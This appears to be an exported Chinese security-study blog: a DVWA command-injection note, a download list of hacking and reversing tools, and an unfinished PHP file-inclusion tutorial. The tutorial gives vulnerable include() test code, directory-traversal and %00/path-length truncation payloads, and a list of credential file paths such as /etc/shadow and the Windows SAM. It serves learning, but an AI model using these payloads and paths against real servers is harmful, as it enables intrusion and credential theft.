<h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    <span class="variable">$target</span> = stripslashes( <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    <span class="variable">$octet</span> = explode( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>相关函数介绍<br>stripslashes(string)<br>stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。</p>
<p>explode(separator,string,limit)<br>把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。</p>
<p>is_numeric(string)<br>检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。</p>
<p>Impossible级别的代码对参数ip进行了严格的限制，只有像“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><font color=#999AAA >简单的通过dvwa来学习一下基本的命令执行漏洞，有关绕过的方法以后再学。</p>
]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>工具下载</title>
    <url>/2021/05/03/%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>



<p>IDA_Pro_v7.5_Portable  <a href="https://down.52pojie.cn/Tools/Disassemblers/IDA_Pro_v7.5_Portable.zip">下载</a></p>
<p>CyberChef_v9.23.1  <a href="https://pan.baidu.com/s/1ctwe_Yra-QJ6PK7CVuDrWg">T0MR</a></p>
<p>Hackbar新版  <a href="https://pan.baidu.com/s/1FKRg5jUWb48m9JH4Ka7LqQ">T0MR</a></p>
<p>Hackbar旧版  <a href="https://pan.baidu.com/s/1LjhTb23fvA-E6qIONR7-_A">T0MR</a></p>
<p>sqli-labs  <a href="https://pan.baidu.com/s/1N9Dq84c08dkixm6OE7timw">T0MR</a></p>
<p>xss-labs  <a href="https://pan.baidu.com/s/1vHBztPxwGe4lJC4yMH2P5g">T0MR</a></p>
<p>upload-labs  <a href="https://pan.baidu.com/s/1QXrB0YM9MvcQL4MZVyul-A">T0MR</a></p>
<p>中国蚁剑  <a href="https://pan.baidu.com/s/1C-1HuUR3X1hob72Dzoqb4Q">T0MR</a></p>
<p>Cheat Engine 7.2  <a href="https://pan.baidu.com/s/13-NbBmVcThxPzG17sl_WGQ">T0MR</a></p>
<p>wireshark 32位  <a href="https://down.52pojie.cn/Tools/Network_Analyzer/Wireshark-win32-3.4.4.7z">下载</a></p>
<p>wireshark 64位  <a href="https://down.52pojie.cn/Tools/Network_Analyzer/Wireshark-win64-3.4.4.7z">下载</a></p>
<p>Seay代码审计  <a href="https://pan.baidu.com/s/1n-W5Mt6lK9agsu3HrQO48A">T0MR</a></p>
<p>burpsuite_pro_v2021.4  <a href="https://pan.baidu.com/s/1yOr-1wJjWPWWbdIwp-aoYw">T0MR</a>（解压后直接运行bat即可，需要java环境，最好是最新版本吧）</p>
<p>MP3Stego_1_1_18  <a href="https://pan.baidu.com/s/18eNsK-cLkDh9spSV8FfjaA">T0MR</a></p>
<p>CaptfEncoder-win-x64  <a href="https://pan.baidu.com/s/1PMqWxxNC3rnLxXicZ2MLwA">T0MR</a></p>
<p>御剑后台扫描珍藏版  <a href="https://pan.baidu.com/s/1AYl7oXmO5R4-5Gky7qUxEQ">T0MR</a></p>
<p>解码工具Converter  <a href="https://pan.baidu.com/s/14CdPL3UfVlvjKDTnG8I1ew">T0MR</a></p>
<p>D盾  <a href="https://pan.baidu.com/s/1y5RLEzjwxGOb0mp5ws2lqg">T0MR</a></p>
<p>tweakpng-1.4.6  <a href="https://pan.baidu.com/s/1_stwVcyc8pM4Rq0ueW3h4Q">T0MR</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>文件包含漏洞学习笔记（未完）</title>
    <url>/2021/04/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>



<h4 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h4><p>PHP中文件包含函数有以下四种：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>()</span><br><span class="line">    </span><br><span class="line"><span class="comment">//具体用法自行百度</span></span><br></pre></td></tr></table></figure>

<p><code>include</code>和<code>require</code>区别主要是：<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
<p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次且你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题的情况。</p>
<h4 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h4><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含了其他恶意文件，导致执行了非预期的代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//实例</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]参数开发者没有经过严格的过滤，直接带入了<span class="keyword">include</span>的函数，攻击者可以修改<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]的值，执行非预期的操作。</span><br></pre></td></tr></table></figure>



<h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>条件:</p>
<ol>
<li>allow_url_fopen=On</li>
<li>变量是可以人为控制的</li>
</ol>
<p>方法:</p>
<ol>
<li>尝试随便读一个文件观察报错得到路径（./当前路径，../跳转上一目录来读取文件）</li>
</ol>
<h4 id="无限制本地文件包含漏洞"><a href="#无限制本地文件包含漏洞" class="headerlink" title="无限制本地文件包含漏洞"></a>无限制本地文件包含漏洞</h4><p>test代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;password                                     &#x2F;&#x2F;通过目录遍历来读取其他文件夹内的文件</span><br></pre></td></tr></table></figure>

<p>常见敏感信息路径:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">windows:</span><br><span class="line">c:\boot.ini &#x2F;&#x2F; 查看系统版本</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IIS配置文件</span><br><span class="line">c:\windows\repair\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码</span><br><span class="line">c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL root密码</span><br><span class="line">c:\windows\php.ini &#x2F;&#x2F; php 配置信息</span><br><span class="line"></span><br><span class="line">linux&#x2F;unix:</span><br><span class="line">&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</span><br><span class="line">&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件</span><br><span class="line">&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件</span><br></pre></td></tr></table></figure>

<h4 id="有限制本地文件包含漏洞绕过"><a href="#有限制本地文件包含漏洞绕过" class="headerlink" title="有限制本地文件包含漏洞绕过"></a>有限制本地文件包含漏洞绕过</h4><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a><a href="https://blog.csdn.net/qq_26090065/article/details/81458937"><strong>%00截断</strong></a></h5><p>条件：</p>
<p>​        magic_quotes_gpc = Off      php版本&lt;5.3.4</p>
<p>test代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;shell.php%00</span><br></pre></td></tr></table></figure>

<h5 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a><strong>路径长度截断</strong></h5><p>条件：</p>
<p>​        windows OS，点号需要长于256；linux OS 长于4096</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows下目录最大长度为256字节，超出的部分会被丢弃；</span><br><span class="line"></span><br><span class="line">Linux下目录最大长度为4096字节，超出的部分会被丢弃。</span><br></pre></td></tr></table></figure>

<p>test代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:filename&#x3D;test.txt&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;</span><br></pre></td></tr></table></figure>



<h5 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a><strong>点号截断</strong></h5><p>条件：</p>
<p>​        windows OS，点号需要长于256</p>
<p>test代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:filename&#x3D;test.txtspan><br></pre></td></tr></table></figure>



<h4 id="session文件包含漏洞"><a href="#session文件包含漏洞" class="headerlink" title="session文件包含漏洞"></a>session文件包含漏洞</h4><p><a href="http://t0mrvvi1b3t.top/2021/04/29/%E5%85%B3%E4%BA%8Esession/">关于session</a></p>
<p>利用条件：当session的存储位置可以获取</p>
<ol>
